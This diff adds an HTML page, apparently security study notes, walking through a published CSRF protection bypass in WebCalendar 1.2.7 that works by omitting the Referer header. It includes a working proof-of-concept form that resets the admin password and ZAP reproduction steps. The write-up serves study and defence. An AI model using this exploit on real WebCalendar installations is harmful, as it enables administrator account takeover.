@@ -1,0 +1,47 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>real ﬂaw found in WebCalendar</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>real ﬂaw found in WebCalendar</h1><br />WebCalendar 1.2.7 (<a
+      href="https://sourceforge.net/projects/webcalendar/files/webcalendar%201.2/1.2.7/WebCalendar-1.2.7.zip/download" target="_blank">Download
+      sourceforge.net</a>)<br />This vulnerability, <a
+      href="lient-Side--Cross-Site_Request_Forgery_(CSRF-XSRF)--Referer_header_vulnerabilities--Validation_of_Referer_depends_on_header_being_present.html">Validation
+      of Referer depends on header being present is been explained HERE</a><br /><br />The WebCalendar CSRF ﬂaw was
+    published by <a href="https://twitter.com/hyp3rlinx" target="_blank">@hyp3rlinx</a> : <a
+      href="http://hyp3rlinx.altervista.org/advisories/WEBCALENDAR-V1.2.7-CSRF-PROTECTION-BYPASS.txt" target="_blank">http://hyp3rlinx.altervista.org/advisories/WEBCALENDAR-V1.2.7-CSRF-PROTECTION-BYPASS.txt</a><br /><strong>POC
+      CSRF Protection Bypass to change Admin password</strong><br />We will use this as the basis for our exploit, note
+    that the username of the victim is required for success<br />
+    <div class="codebox">
+      <div class="codebox">
+        &lt;meta&nbsp;name=&quot;referrer&quot;&nbsp;content=&quot;none&quot;&gt;<br /><br />&lt;form&nbsp;id=&quot;CSRF&quot;&nbsp;action=&quot;http://localhost/WebCalendar-1.2.7/edit_user_handler.php&quot;&nbsp;<br />method=&quot;post&quot;&gt;<br />&lt;input&nbsp;type=&quot;hidden&quot;&nbsp;name=&quot;formtype&quot;&nbsp;value=&quot;setpassword&quot;&nbsp;/&gt;<br />&lt;input&nbsp;type=&quot;hidden&quot;&nbsp;name=&quot;user&quot;&nbsp;value=&quot;admin&quot;&nbsp;/&gt;<br />&lt;input&nbsp;name=&quot;upassword1&quot;&nbsp;id=&quot;newpass1&quot;&nbsp;type=&quot;password&quot;&nbsp;value=&quot;123456&quot;&nbsp;/&gt;<br />&lt;input&nbsp;name=&quot;upassword2&quot;&nbsp;id=&quot;newpass2&quot;&nbsp;type=&quot;password&quot;&nbsp;value=&quot;123456&quot;&nbsp;/&gt;<br /><span
+          style="color:#000000;font-weight:400">&lt;</span>/form<span style="color:#000000;font-weight:400">&gt;</span>
+      </div>
+    </div><br /> <br /> <br />1. Login to the vulnerable Website<br /> <a href=""><img src="images/1606-1.png"
+        alt="images/1606-1.png" /></a><br />2. Go to Settings → MyProfile<br /> <a href=""><img src="images/1606-2.png"
+        alt="images/1606-2.png" /></a><br />3. Set a new password<br /> <a href=""><img src="images/1606-3.png"
+        alt="images/1606-3.png" /></a><br /> <a href=""><img src="images/1606-4.png"
+        alt="images/1606-4.png" /></a><br />4. In ZAP:Double-click on the POST to
+    https://example.org/webcalendar/edit_user_handler.php <br /> <a href=""><img src="images/1606-5.png"
+        alt="images/1606-5.png" /></a><br /> Then check “Request” to take note of the referer:
+    <code>Referer: https://example.org/webcalendar/edit_user.php </code><br /> <a href=""><img src="images/1606-6.png"
+        alt="images/1606-6.png" /></a><br />5. Right-click on the POST and choose &quot;Generate Anti CSRF Test
+    FORM&quot;<br /> <a href=""><img src="images/1606-7.png" alt="images/1606-7.png" /></a><br /> <a href=""><img
+        src="images/1606-8.png" alt="images/1606-8.png" /></a><br /> Click on Submit<br /> <a href=""><img
+        src="images/1606-9.png" alt="images/1606-9.png" /></a><br />6. This worked because WebCalendar attempts to uses
+    the HTTP Referer to check that requests are originating from same server… However, this can be easily <span
+      style="text-decoration:underline;">defeated by just not sending a referer</span><br /> ZAP does not set a referer
+    via the Anti-CSRF Test Form, and a blank referer also passes WebCalendar&#39;s (weak) check.<br /> If fact we can
+    check that there is not a &quot;Referer&quot; in the POST sent by the Anti-CSRF Test Form<br /> <a href=""><img
+        src="images/1606-10.png" alt="images/1606-10.png" /></a><br />6.
+  </div>
+</body>
+
+</html>
